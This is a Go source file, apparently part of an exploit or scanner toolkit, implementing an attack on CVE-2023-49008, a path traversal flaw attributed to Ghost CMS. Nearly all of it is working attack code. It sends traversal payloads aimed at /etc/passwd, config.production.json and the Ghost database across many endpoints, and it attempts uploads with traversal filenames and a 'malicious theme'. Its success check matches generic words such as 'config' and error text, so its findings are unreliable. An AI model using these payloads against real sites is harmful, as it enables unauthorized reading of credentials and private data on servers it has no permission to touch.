package exploits

import (
	"fmt"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
)

// CVE202349008Exploit represents the CVE-2023-49008 exploit
type CVE202349008Exploit struct {
	client  *resty.Client
	target  string
	timeout time.Duration
}

// CVE202349008Result represents the result of CVE-2023-49008 exploitation
type CVE202349008Result struct {
	Vulnerable    bool     `json:"vulnerable"`
	Exploitable   bool     `json:"exploitable"`
	Payloads      []string `json:"payloads"`
	Responses     []string `json:"responses"`
	ErrorMessages []string `json:"error_messages"`
	Severity      string   `json:"severity"`
	Description   string   `json:"description"`
	Remediation   string   `json:"remediation"`
}

// NewCVE202349008Exploit creates a new CVE-2023-49008 exploit instance
func NewCVE202349008Exploit(target string, timeout time.Duration) *CVE202349008Exploit {
	client := resty.New()
	client.SetTimeout(timeout)
	client.SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	client.SetRedirectPolicy(resty.FlexibleRedirectPolicy(5))

	return &CVE202349008Exploit{
		client:  client,
		target:  strings.TrimSuffix(target, "/"),
		timeout: timeout,
	}
}

// Exploit attempts to exploit CVE-2023-49008 (Path Traversal)
func (e *CVE202349008Exploit) Exploit() (*CVE202349008Result, error) {
	result := &CVE202349008Result{
		Severity:    "High",
		Description: "CVE-2023-49008: Path traversal vulnerability in Ghost CMS allowing unauthorized file access",
		Remediation: "Update Ghost to version 5.73.2 or later",
		Payloads:    []string{},
		Responses:   []string{},
	}

	// Path traversal payloads for Ghost CMS
	payloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"../../../proc/version",
		"../../../etc/hostname",
		"../../../var/log/ghost/ghost.log",
		"../../../content/settings/routes.yaml",
		"../../../content/data/ghost.db",
		"../../../config.production.json",
		"../../../config.development.json",
		"../../../package.json",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"....//....//....//etc/passwd",
		"..;/..;/..;/etc/passwd",
		"..\\..\\..\\/etc/passwd",
	}

	// Test various endpoints that might be vulnerable
	endpoints := []string{
		"/ghost/api/v4/admin/files/",
		"/ghost/api/v4/admin/images/",
		"/content/files/",
		"/content/images/",
		"/assets/",
		"/public/",
		"/ghost/",
		"/admin/",
	}

	for _, endpoint := range endpoints {
		for _, payload := range payloads {
			testURL := fmt.Sprintf("%s%s%s", e.target, endpoint, payload)
			result.Payloads = append(result.Payloads, testURL)

			resp, err := e.client.R().Get(testURL)
			if err != nil {
				result.ErrorMessages = append(result.ErrorMessages, err.Error())
				continue
			}

			responseBody := resp.String()
			result.Responses = append(result.Responses, fmt.Sprintf("Status: %d, Body: %s", resp.StatusCode(), responseBody[:min(200, len(responseBody))]))

			// Check for successful path traversal indicators
			if e.isPathTraversalSuccessful(resp.StatusCode(), responseBody) {
				result.Vulnerable = true
				result.Exploitable = true
				return result, nil
			}
		}
	}

	// Test file upload endpoints with path traversal
	result = e.testFileUploadTraversal(result)

	// Test theme upload with path traversal
	result = e.testThemeUploadTraversal(result)

	return result, nil
}

// isPathTraversalSuccessful checks if the response indicates successful path traversal
func (e *CVE202349008Exploit) isPathTraversalSuccessful(statusCode int, body string) bool {
	// Check for successful file access indicators
	successIndicators := []string{
		"root:x:",           // /etc/passwd content
		"daemon:x:",         // /etc/passwd content
		"# localhost",       // hosts file content
		"127.0.0.1",         // hosts file content
		"Linux version",     // /proc/version content
		"Microsoft Windows", // Windows system files
		"[drivers]",         // Windows hosts file
		"ghost",             // Ghost-specific files
		"database",          // Database files
		"config",            // Configuration files
		"\"name\": \"ghost\"", // package.json content
	}

	body = strings.ToLower(body)
	for _, indicator := range successIndicators {
		if strings.Contains(body, strings.ToLower(indicator)) {
			return true
		}
	}

	// Check for error messages that might indicate file access
	errorIndicators := []string{
		"permission denied",
		"access denied",
		"file not found",
		"no such file",
		"cannot access",
	}

	for _, indicator := range errorIndicators {
		if strings.Contains(body, indicator) {
			return true // Even error messages can indicate path traversal attempt was processed
		}
	}

	return false
}

// testFileUploadTraversal tests file upload endpoints for path traversal
func (e *CVE202349008Exploit) testFileUploadTraversal(result *CVE202349008Result) *CVE202349008Result {
	uploadEndpoints := []string{
		"/ghost/api/v4/admin/files/upload/",
		"/ghost/api/v4/admin/images/upload/",
	}

	traversalPaths := []string{
		"../../../etc/passwd",
		"../../../config.production.json",
		"../../../content/data/ghost.db",
	}

	for _, endpoint := range uploadEndpoints {
		for _, path := range traversalPaths {
			testURL := fmt.Sprintf("%s%s", e.target, endpoint)
			result.Payloads = append(result.Payloads, fmt.Sprintf("POST %s with path: %s", testURL, path))

			// Attempt to upload with malicious filename
			resp, err := e.client.R().
				SetFormData(map[string]string{
					"file": path,
					"path": path,
				}).
				Post(testURL)

			if err != nil {
				result.ErrorMessages = append(result.ErrorMessages, err.Error())
				continue
			}

			responseBody := resp.String()
			result.Responses = append(result.Responses, fmt.Sprintf("Upload Status: %d, Body: %s", resp.StatusCode(), responseBody[:min(200, len(responseBody))]))

			if e.isPathTraversalSuccessful(resp.StatusCode(), responseBody) {
				result.Vulnerable = true
				result.Exploitable = true
			}
		}
	}

	return result
}

// testThemeUploadTraversal tests theme upload for path traversal
func (e *CVE202349008Exploit) testThemeUploadTraversal(result *CVE202349008Result) *CVE202349008Result {
	themeEndpoint := fmt.Sprintf("%s/ghost/api/v4/admin/themes/upload/", e.target)
	result.Payloads = append(result.Payloads, fmt.Sprintf("POST %s with malicious theme", themeEndpoint))

	// Create a malicious theme package with path traversal
	maliciousTheme := `{
		"name": "../../../malicious",
		"version": "1.0.0",
		"description": "Path traversal test",
		"engines": {
			"ghost": ">=4.0.0"
		}
	}`

	resp, err := e.client.R().
		SetFormData(map[string]string{
			"theme": maliciousTheme,
			"ref": "../../../etc/passwd",
		}).
		Post(themeEndpoint)

	if err != nil {
		result.ErrorMessages = append(result.ErrorMessages, err.Error())
		return result
	}

	responseBody := resp.String()
	result.Responses = append(result.Responses, fmt.Sprintf("Theme Upload Status: %d, Body: %s", resp.StatusCode(), responseBody[:min(200, len(responseBody))]))

	if e.isPathTraversalSuccessful(resp.StatusCode(), responseBody) {
		result.Vulnerable = true
		result.Exploitable = true
	}

	return result
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// GetCVEInfo returns information about CVE-2023-49008
func (e *CVE202349008Exploit) GetCVEInfo() map[string]interface{} {
	return map[string]interface{}{
		"cve_id":      "CVE-2023-49008",
		"severity":    "High",
		"cvss_score":  7.5,
		"description": "Path traversal vulnerability in Ghost CMS allowing unauthorized file access through various endpoints",
		"affected_versions": []string{
			"< 5.73.2",
		},
		"remediation": "Update Ghost to version 5.73.2 or later",
		"references": []string{
			"https://github.com/TryGhost/Ghost/security/advisories/GHSA-9fgx-q25h-jxrg",
			"https://nvd.nist.gov/vuln/detail/CVE-2023-49008",
		},
		"attack_vector": "Network",
		"complexity":   "Low",
		"impact": map[string]string{
			"confidentiality": "High",
			"integrity":       "None",
			"availability":    "None",
		},
	}
}